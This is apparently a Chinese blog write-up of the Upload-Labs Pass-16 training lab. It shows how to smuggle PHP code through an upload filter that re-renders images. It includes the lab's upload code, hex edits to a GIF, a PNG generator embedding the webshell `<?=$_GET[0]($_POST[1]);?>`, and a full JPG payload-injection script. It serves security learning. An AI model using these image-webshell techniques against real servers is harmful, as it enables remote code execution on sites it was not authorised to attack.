---
title: Upload-Labs之Pass-16
categories: ['DROPS']
tags: ['文件上传漏洞']
cover: 'https://cdn.jsdelivr.net/gh/penginman/PicBed@master/cover/20201116224711.jpg'
date: 2020-11-16 22:50:25
---


## 前言

​	我在这道题上花了快一天的时间，但是也学到了不少姿势，觉得东西应该足够多，而且参考了的博客发现这道题算是有歧义的，不知道作者想要考察的点是哪一个，所以算是有两种解法吧，可惜的是两种方法都不算是大成功，只有部分成功执行了。

​	参考博客：[upload-labs之pass 16详细分析](https://xz.aliyun.com/t/2657#toc-4)

## Pass-16

​	源码（三种图片的判定，只贴一个吧，篇幅小一点）：

```php
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])){
    // 获得上传文件的基本信息，文件名，类型，大小，临时文件路径
    $filename = $_FILES['upload_file']['name'];
    $filetype = $_FILES['upload_file']['type'];
    $tmpname = $_FILES['upload_file']['tmp_name'];

    $target_path=UPLOAD_PATH.'/'.basename($filename);

    // 获得上传文件的扩展名
    $fileext= substr(strrchr($filename,"."),1);

    //判断文件后缀与类型，合法才进行上传操作
    if(($fileext == "jpg") && ($filetype=="image/jpeg")){
        if(move_uploaded_file($tmpname,$target_path)){
            //使用上传的图片生成新的图片
            $im = imagecreatefromjpeg($target_path);

            if($im == false){
                $msg = "该文件不是jpg格式的图片！";
                @unlink($target_path);
            }else{
                //给新图片指定文件名
                srand(time());
                $newfilename = strval(rand()).".jpg";
                //显示二次渲染后的图片（使用用户上传图片生成的新图片）
                $img_path = UPLOAD_PATH.'/'.$newfilename;
                imagejpeg($im,$img_path);
                @unlink($target_path);
                $is_upload = true;
            }
        } else {
            $msg = "上传出错！";
        }

    }else if(($fileext == "png") && ($filetype=="image/png")){
        ......
    }else if(($fileext == "gif") && ($filetype=="image/gif")){
        .....
    }else{
        $msg = "只允许上传后缀为.jpg|.png|.gif的图片文件！";
    }
}
```

​	提示：`本pass重新渲染了图片！`。说明对图片进行了二次渲染，我的理解就是把上传的图片，根据一些标准，只把图片中的图片信息提取出来，再生成一个图片，可以有效避免图片马。

​	首先是分析一波源码：

​	以jpg文件判定为例。获取文件名、类型、临时文件路径，获取文件后缀，进入jpg图片判定，判定的方式是通过文件后缀和文件的类型判定，再执行`move_uploaded_file`函数先把文件移动到`upload`文件夹，现在文件路径是`$target_path`，之后对图片进行二次渲染。

​	二次渲染用到了`imagecreatefromjpeg`函数，官方解释：由文件或 URL 创建一个新图象，返回一图像标识符，代表了从给定的文件名取得的图像（这时候图像对象还是一个空的）。然后判断是否是一个图片文件，如果不是的话执行`unlink`函数删除文件，否则，为新图片随机一个名称，执行`imagejpeg`函数把图象输出到新文件` $newfilename`。再将之前用户上传的文件`$target_path`删除掉。

​	根据上面的分析就能得出来两种思路：

1. **访问二次渲染之前的上传的文件。**
2. **在图片二次渲染以后图片马未失效。**



## 第一种方法

​	（Linux环境、php版本7.2.21）

​	因为二次渲染那部分`if、else`无论如何都会执行`unlink`函数删除你的文件，需要在执行`imagecreatefromjpeg`时报错才能访问到自己原来上传的文件。

### jpg格式

#### 准备并上传

​	需要准备只含有一句话木马的文件并命名为.jpg格式。直接上传。

![](https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201116200050.png)

#### 文件包含验证

​	上传以后我使用的在线靶场网页中题目部分直接消失了，这就说明函数执行过程中出错导致页面也没有正常返回。然后就可以使用`inclue.php`文件包含访问刚刚上传的文件

![](https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201116200401.png)	

### 其他格式

​	如图成功访问就是图片马上传成功了。但是这个方法我只有`jpg`格式的文件上传成功了，另外两种格式的图片没有上传成功，这个我感觉需要了解`imagecreatefromjpeg`、`imagecreatefrompng`、`imagecreatefromgif`，这三个函数的原理，让其报错即可。



## 第二种方法

​	（windows环境，php版本5.2.17）

​	这种方法是让图片码在经过二次渲染以后，能保证代码不会被二次渲染给过滤掉。从最简单的一个一个来。

​	用到的工具是**Beyond Compare 4**，是一个文件比较的工具，就是查看图片渲染修改的哪些部分，还可以查看文件的16进制格式。

### GIF格式

#### 准备并上传

​	上传一个使用`copy /b`指令制作的图片马，之前文章第13题用过。假设上传的图片马为**yoo.gif**，上传成功以后再下载下载的文件名为**2119840023.gif**。

![](https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201116203245.png)

#### 	文件比较

​	使用前面说的**Beyond Compare 4**工具进行比较，左边是渲染前的文件，右边是渲染后的文件，图片中白色的地方就是两个文件**相同**的地方，红色部分则是文件不同的地方。看的出来图片文件的前面一大部分二次渲染的时候都没有改变，所以我们可以直接将代码放在这一部分逃过二次渲染。`<?php phpinfo(); ?>`的十六进制是`3C 3F 70 68 70 20 70 68 70 69 6E 66 6F 28 29 3B 20 3F 3E`直接粘贴插入，在右边框中右键保存文件再进行上传。

#### 文件包含验证	

​	上传以后进行文件包含，代码执行成功。

![](https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201116204104.png)

​	为了验证我们的想法，我们可以刚刚把上传的图片再下载下载，查看插入的代码是否逃过了二次渲染（废话执行成功了代码肯定在）。



### png格式

​	这题自己原来打算模仿gif的方法修改图片，但是上传以后下载，对比文件十六进制不同的时候我傻了

![](https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201116204635.png)

​	这不同还是一段一段的，根本不可能模仿gif的方法，上面那一段相同的还是图片的**头标识**部分，修改的话就不是png格式图片，更过不了。

​	所以我直接看答案了，还是前言里的[博客](https://xz.aliyun.com/t/2657#toc-3)。png图片由3个以上的数据块组成，然后又分了图片基本信息、实际数据块、辅助数据块blablablabl，而且数据块中还有CRC码，学过计算机网络的都知道CRC码是验证错误的，自己随便插入代码以后不修改CRC码肯定是过不了的。

​	所以又出来了两种方法：

1. 修改CRC码
2. 直接生成图片

#### 计算CRC码

​	计算CRC码的`python`脚本

```
import binascii
import re

png = open(r'1.png','rb')
a = png.read()
png.close()
hexstr = binascii.b2a_hex(a)

''' PLTE crc '''
data =  '504c5445'+ re.findall('504c5445(.*?)49444154',hexstr)[0]
crc = binascii.crc32(data[:-16].decode('hex')) & 0xffffffff
print hex(crc)
```

##### 准备

​	php底层在对PLTE数据块验证的时候,主要进行了CRC校验.所以可以在该部分**写入代码**，再重新计算CRC码，再修改原来的CRC码即可。

##### 	计算CRC码

​	脚本会打开名为1.png的文件然后输出计算以后的CRC码结果。在把结果覆盖原来的CRC码上传图片就不会出错了。



这个方法我没有尝试，因为我不会python。~~都2020年了还有人不会python，不会吧不会吧~~。😒

等我学会在回来改这一篇吧。

#### 直接生成图片（写入实际数据模块）

​	国外大牛的脚本，直接运行就会生成一个图片

```
<?php
$p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23,
           0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae,
           0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc,
           0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f,
           0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c,
           0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d,
           0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1,
           0x66, 0x44, 0x50, 0x33);



$img = imagecreatetruecolor(32, 32);

for ($y = 0; $y < sizeof($p); $y += 3) {
   $r = $p[$y];
   $g = $p[$y+1];
   $b = $p[$y+2];
   $color = imagecolorallocate($img, $r, $g, $b);
   imagesetpixel($img, round($y / 3), 0, $color);
}

imagepng($img,'./1.png');
?>
```

​	php指令怎么执行？如果你本机有php环境，可以在php的根目录下找到一个名为`php.exe`的可执行文件，它是php提供的一种**CLI**模式，也就是**命令行模式**。我把php脚本放在了php的根目录，然后cmd切换到对应目录执行。

​	还有一种方法是借用本地搭建的靶机环境，把php放在目录使用浏览器访问一下即可。

​	运行成功以后会找到一个名为**1.png**的图片。这个就是生成的图片马了。可以尝试上传进行渲染以后下载到本地，使用文件比较验证。

​	但是这个生成的图片php代码是`<?=$_GET[0]($_POST[1]);?>`，应该是个一句话木马但是现在的我还不会用。源码也不知道怎么修改，总之图片渲染以后代码没有被去掉就算成功了吧，~~应该算吧~~

### jpg格式

​	同样看答案。国外大牛写的脚本jpg_payload.php，可以向jpg图片里写入代码

```php
?php
    /*

    The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled().
    It is necessary that the size and quality of the initial image are the same as those of the processed image.

    1) Upload an arbitrary image via secured files upload script
    2) Save the processed image and launch:
    jpg_payload.php <jpg_name.jpg>

    In case of successful injection you will get a specially crafted image, which should be uploaded again.

    Since the most straightforward injection method is used, the following problems can occur:
    1) After the second processing the injected data may become partially corrupted.
    2) The jpg_payload.php script outputs "Something's wrong".
    If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image.

    Sergey Bobrov @Black2Fan.

    See also:
    https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/

    */

    $miniPayload = "<?=phpinfo();?>";


    if(!extension_loaded('gd') || !function_exists('imagecreatefromjpeg')) {
        die('php-gd is not installed');
    }

    if(!isset($argv[1])) {
        die('php jpg_payload.php <jpg_name.jpg>');
    }

    set_error_handler("custom_error_handler");

    for($pad = 0; $pad < 1024; $pad++) {
        $nullbytePayloadSize = $pad;
        $dis = new DataInputStream($argv[1]);
        $outStream = file_get_contents($argv[1]);
        $extraBytes = 0;
        $correctImage = TRUE;

        if($dis->readShort() != 0xFFD8) {
            die('Incorrect SOI marker');
        }

        while((!$dis->eof()) && ($dis->readByte() == 0xFF)) {
            $marker = $dis->readByte();
            $size = $dis->readShort() - 2;
            $dis->skip($size);
            if($marker === 0xDA) {
                $startPos = $dis->seek();
                $outStreamTmp = 
                    substr($outStream, 0, $startPos) . 
                    $miniPayload . 
                    str_repeat("\0",$nullbytePayloadSize) . 
                    substr($outStream, $startPos);
                checkImage('_'.$argv[1], $outStreamTmp, TRUE);
                if($extraBytes !== 0) {
                    while((!$dis->eof())) {
                        if($dis->readByte() === 0xFF) {
                            if($dis->readByte !== 0x00) {
                                break;
                            }
                        }
                    }
                    $stopPos = $dis->seek() - 2;
                    $imageStreamSize = $stopPos - $startPos;
                    $outStream = 
                        substr($outStream, 0, $startPos) . 
                        $miniPayload . 
                        substr(
                            str_repeat("\0",$nullbytePayloadSize).
                                substr($outStream, $startPos, $imageStreamSize),
                            0,
                            $nullbytePayloadSize+$imageStreamSize-$extraBytes) . 
                                substr($outStream, $stopPos);
                } elseif($correctImage) {
                    $outStream = $outStreamTmp;
                } else {
                    break;
                }
                if(checkImage('payload_'.$argv[1], $outStream)) {
                    die('Success!');
                } else {
                    break;
                }
            }
        }
    }
    unlink('payload_'.$argv[1]);
    die('Something\'s wrong');

    function checkImage($filename, $data, $unlink = FALSE) {
        global $correctImage;
        file_put_contents($filename, $data);
        $correctImage = TRUE;
        imagecreatefromjpeg($filename);
        if($unlink)
            unlink($filename);
        return $correctImage;
    }

    function custom_error_handler($errno, $errstr, $errfile, $errline) {
        global $extraBytes, $correctImage;
        $correctImage = FALSE;
        if(preg_match('/(\d+) extraneous bytes before marker/', $errstr, $m)) {
            if(isset($m[1])) {
                $extraBytes = (int)$m[1];
            }
        }
    }

    class DataInputStream {
        private $binData;
        private $order;
        private $size;

        public function __construct($filename, $order = false, $fromString = false) {
            $this->binData = '';
            $this->order = $order;
            if(!$fromString) {
                if(!file_exists($filename) || !is_file($filename))
                    die('File not exists ['.$filename.']');
                $this->binData = file_get_contents($filename);
            } else {
                $this->binData = $filename;
            }
            $this->size = strlen($this->binData);
        }

        public function seek() {
            return ($this->size - strlen($this->binData));
        }

        public function skip($skip) {
            $this->binData = substr($this->binData, $skip);
        }

        public function readByte() {
            if($this->eof()) {
                die('End Of File');
            }
            $byte = substr($this->binData, 0, 1);
            $this->binData = substr($this->binData, 1);
            return ord($byte);
        }

        public function readShort() {
            if(strlen($this->binData) < 2) {
                die('End Of File');
            }
            $short = substr($this->binData, 0, 2);
            $this->binData = substr($this->binData, 2);
            if($this->order) {
                $short = (ord($short[1]) << 8) + ord($short[0]);
            } else {
                $short = (ord($short[0]) << 8) + ord($short[1]);
            }
            return $short;
        }

        public function eof() {
            return !$this->binData||(strlen($this->binData) === 0);
        }
    }
?>
```

#### 准备

​	准备一个**yoo.jpg**图片，上传经过渲染以后再下载下到本地，保存为**1.jpg**。

#### 插入代码

​	使用脚本处理**1.jpg**插入php代码，执行命令`php jpg_payload.php 1.jpg`。php命令执行方法上面有。执行成功以后应该如图所示：

![](https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201116212640.png)

​	执行的目录下会多出一个名为`payload_1.jpg`的文件，这就是制作好的图片马。大佬的源码我是修改了一下的，可以修改上面的第25行代码，自定义插入想要的代码。

#### 上传并验证

​	上传以后同样先确定图片的名称和地址，适用文件包含进行验证

![](https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201116215008.png)

​	如果如图所示，我们的图片马就上传成功了。**需要提醒：有些图片不行可能需要多换几个图片试一试！！！**

呼，终于可以休息了。





